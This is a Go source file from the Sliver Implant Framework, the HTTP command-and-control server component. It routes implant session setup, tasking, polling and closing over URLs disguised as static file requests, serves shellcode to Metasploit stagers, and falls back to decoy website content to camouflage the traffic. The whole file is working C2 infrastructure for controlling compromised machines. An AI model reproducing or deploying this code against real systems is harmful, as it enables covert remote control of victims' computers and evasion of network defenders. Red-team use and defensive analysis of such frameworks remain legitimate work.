package http

/*
   Sliver Implant Framework
   Copyright (C) 2019  Bishop Fox

   This program is free software: you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation, either version 3 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"net/http"
	"time"

	"github.com/gorilla/mux"
	"google.golang.org/protobuf/proto"

	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/server/core"
	"github.com/bishopfox/sliver/server/cryptography"
	"github.com/bishopfox/sliver/server/db"
	sliverHandlers "github.com/bishopfox/sliver/server/handlers"
	"github.com/bishopfox/sliver/server/website"
	"github.com/bishopfox/sliver/util/encoders"
)

// HTTPHandler - Path mapped to a handler function
type HTTPHandler func(resp http.ResponseWriter, req *http.Request)

func (s *SliverHTTPC2) router() *mux.Router {
	router := mux.NewRouter()

	// Start Session Handler
	router.HandleFunc(
		fmt.Sprintf("/{rpath:.*\\.%s$}", s.c2Config.ImplantConfig.StartSessionFileExt),
		s.startSessionHandler,
	).MatcherFunc(s.filterOTP).MatcherFunc(s.filterNonce).Methods(http.MethodGet, http.MethodPost)

	// Session Handler
	router.HandleFunc(
		fmt.Sprintf("/{rpath:.*\\.%s$}", s.c2Config.ImplantConfig.SessionFileExt),
		s.sessionHandler,
	).MatcherFunc(s.filterNonce).Methods(http.MethodGet, http.MethodPost)

	// Poll Handler
	router.HandleFunc(
		fmt.Sprintf("/{rpath:.*\\.%s$}", s.c2Config.ImplantConfig.PollFileExt),
		s.pollHandler,
	).MatcherFunc(s.filterNonce).Methods(http.MethodGet)

	// Close Handler
	router.HandleFunc(
		fmt.Sprintf("/{rpath:.*\\.%s$}", s.c2Config.ImplantConfig.CloseFileExt),
		s.closeHandler,
	).MatcherFunc(s.filterNonce).Methods(http.MethodGet)

	// Can't force the user agent on the stager payload
	// Request from msf stager payload will look like:
	// GET /fonts/Inter-Medium.woff/B64_ENCODED_PAYLOAD_UUID
	router.HandleFunc(
		fmt.Sprintf("/{rpath:.*\\.%s[/]{0,1}.*$}", s.c2Config.ImplantConfig.StagerFileExt),
		s.stagerHander,
	).MatcherFunc(s.filterOTP).Methods(http.MethodGet)

	// Default handler returns static content or 404s
	router.HandleFunc("/{rpath:.*}", s.defaultHandler).Methods(http.MethodGet, http.MethodPost)

	router.Use(loggingMiddleware)
	router.Use(s.DefaultRespHeaders)

	return router
}

func (s *SliverHTTPC2) startSessionHandler(resp http.ResponseWriter, req *http.Request) {
	httpLog.Debug("Start http session request")
	nonce, _ := getNonceFromURL(req.URL)
	_, encoder, err := encoders.EncoderFromNonce(nonce)
	if err != nil {
		httpLog.Warnf("Request specified an invalid encoder (%d)", nonce)
		s.defaultHandler(resp, req)
		return
	}
	body, err := ioutil.ReadAll(req.Body)
	if err != nil {
		httpLog.Errorf("Failed to read body %s", err)
		s.defaultHandler(resp, req)
		return
	}
	data, err := encoder.Decode(body)
	if err != nil {
		httpLog.Errorf("Failed to decode body %s", err)
		s.defaultHandler(resp, req)
		return
	}
	if len(data) < 32 {
		httpLog.Warn("Invalid data length")
		s.defaultHandler(resp, req)
		return
	}

	var publicKeyDigest [32]byte
	copy(publicKeyDigest[:], data[:32])
	implantConfig, err := db.ImplantConfigByECCPublicKeyDigest(publicKeyDigest)
	if err != nil || implantConfig == nil {
		httpLog.Warn("Unknown public key")
		s.defaultHandler(resp, req)
		return
	}
	// Don't forget to re-add the b64 padding, the length is known so no big deal
	publicKey, err := base64.StdEncoding.DecodeString(implantConfig.ECCPublicKey + "=")
	if err != nil || len(publicKey) != 32 {
		httpLog.Warn("Failed to decode public key")
		s.defaultHandler(resp, req)
		return
	}
	var senderPublicKey [32]byte
	copy(senderPublicKey[:], publicKey)

	serverKeyPair := cryptography.ECCServerKeyPair()
	sessionInitData, err := cryptography.ECCDecrypt(&senderPublicKey, serverKeyPair.Private, data[32:])
	if err != nil {
		httpLog.Error("ECC decryption failed")
		s.defaultHandler(resp, req)
		return
	}
	sessionInit := &sliverpb.HTTPSessionInit{}
	err = proto.Unmarshal(sessionInitData, sessionInit)
	if err != nil {
		httpLog.Error("Failed to decode session init")
		return
	}

	httpSession := newHTTPSession()
	sKey, err := cryptography.KeyFromBytes(sessionInit.Key)
	if err != nil {
		httpLog.Error("Failed to convert bytes to session key")
		return
	}
	httpSession.CipherCtx = cryptography.NewCipherContext(sKey)

	proto := "http(s)"
	if s.profile.Channel == sliverpb.C2_HTTP {
		proto = "http"
	}
	if s.profile.Channel == sliverpb.C2_HTTPS {
		proto = "https"
	}
	httpSession.ImplanConn = core.NewImplantConnection(proto, getRemoteAddr(req))
	s.HTTPSessions.Add(httpSession)
	httpLog.Infof("Started new session with http session id: %s", httpSession.ID)

	responseCiphertext, err := httpSession.CipherCtx.Encrypt([]byte(httpSession.ID))
	if err != nil {
		httpLog.Info("Failed to encrypt session identifier")
		s.defaultHandler(resp, req)
		return
	}
	http.SetCookie(resp, &http.Cookie{
		Domain:   s.getServerDomain(),
		Name:     s.getCookieName(),
		Value:    httpSession.ID,
		Secure:   false,
		HttpOnly: true,
	})
	resp.Write(encoder.Encode(responseCiphertext))
}

func (s *SliverHTTPC2) sessionHandler(resp http.ResponseWriter, req *http.Request) {
	httpLog.Debug("Session request")
	httpSession := s.getHTTPSession(req)
	if httpSession == nil {
		s.defaultHandler(resp, req)
		return
	}
	httpSession.ImplanConn.UpdateLastMessage()

	plaintext, err := s.readReqBody(httpSession, resp, req)
	if err != nil {
		httpLog.Warnf("Failed to decode request body: %s", err)
		return
	}
	envelope := &sliverpb.Envelope{}
	proto.Unmarshal(plaintext, envelope)

	resp.WriteHeader(http.StatusAccepted)
	handlers := sliverHandlers.GetHandlers()
	if envelope.ID != 0 {
		httpSession.ImplanConn.RespMutex.RLock()
		defer httpSession.ImplanConn.RespMutex.RUnlock()
		if resp, ok := httpSession.ImplanConn.Resp[envelope.ID]; ok {
			resp <- envelope
		}
	} else if handler, ok := handlers[envelope.Type]; ok {
		respEnvelope := handler(httpSession.ImplanConn, envelope.Data)
		if respEnvelope != nil {
			go func() {
				httpSession.ImplanConn.Send <- respEnvelope
			}()
		}
	}
}

func (s *SliverHTTPC2) pollHandler(resp http.ResponseWriter, req *http.Request) {
	httpLog.Debug("Poll request")
	httpSession := s.getHTTPSession(req)
	if httpSession == nil {
		s.defaultHandler(resp, req)
		return
	}
	httpSession.ImplanConn.UpdateLastMessage()

	// We already know we have a valid nonce because of the middleware filter
	nonce, _ := getNonceFromURL(req.URL)
	_, encoder, _ := encoders.EncoderFromNonce(nonce)
	select {
	case envelope := <-httpSession.ImplanConn.Send:
		resp.WriteHeader(http.StatusOK)
		envelopeData, _ := proto.Marshal(envelope)
		ciphertext, err := httpSession.CipherCtx.Encrypt(envelopeData)
		if err != nil {
			httpLog.Errorf("Failed to encrypt message %s", err)
			ciphertext = []byte{}
		}
		resp.Write(encoder.Encode(ciphertext))
	case <-req.Context().Done():
		httpLog.Debug("Poll client hang up")
		return
	case <-time.After(s.getPollTimeout()):
		httpLog.Debug("Poll time out")
		resp.WriteHeader(http.StatusNoContent)
		resp.Write([]byte{})
	}
}

func (s *SliverHTTPC2) closeHandler(resp http.ResponseWriter, req *http.Request) {
	httpLog.Debug("Close request")
	httpSession := s.getHTTPSession(req)
	if httpSession == nil {
		httpLog.Infof("No session with id %#v", httpSession.ID)
		s.defaultHandler(resp, req)
		return
	}
	for _, cookie := range req.Cookies() {
		cookie.MaxAge = -1
		http.SetCookie(resp, cookie)
	}
	s.HTTPSessions.Remove(httpSession.ID)
	resp.WriteHeader(http.StatusAccepted)
}

// stagerHander - Serves the sliver shellcode to the stager requesting it
func (s *SliverHTTPC2) stagerHander(resp http.ResponseWriter, req *http.Request) {
	httpLog.Debug("Stager request")
	if len(s.SliverStage) != 0 {
		httpLog.Infof("Received staging request from %s", getRemoteAddr(req))
		resp.Write(s.SliverStage)
		httpLog.Infof("Serving sliver shellcode (size %d) to %s", len(s.SliverStage), getRemoteAddr(req))
		resp.WriteHeader(http.StatusOK)
	} else {
		resp.WriteHeader(http.StatusNotFound)
	}
}

func (s *SliverHTTPC2) websiteContentHandler(resp http.ResponseWriter, req *http.Request) error {
	httpLog.Infof("Request for site %v -> %s", s.profile.Website, req.RequestURI)
	contentType, content, err := website.GetContent(s.profile.Website, req.RequestURI)
	if err != nil {
		httpLog.Infof("No website content for %s", req.RequestURI)
		return err
	}
	resp.Header().Set("Content-type", contentType)
	resp.Write(content)
	return nil
}

func (s *SliverHTTPC2) defaultHandler(resp http.ResponseWriter, req *http.Request) {
	// Request does not match the C2 profile so we pass it to the static content or 404 handler
	if s.profile.Website != "" {
		httpLog.Infof("Serving static content from website %v", s.profile.Website)
		err := s.websiteContentHandler(resp, req)
		if err == nil {
			return
		}
	}
	httpLog.Debugf("[404] No match for %s", req.RequestURI)
	resp.WriteHeader(http.StatusNotFound)
}
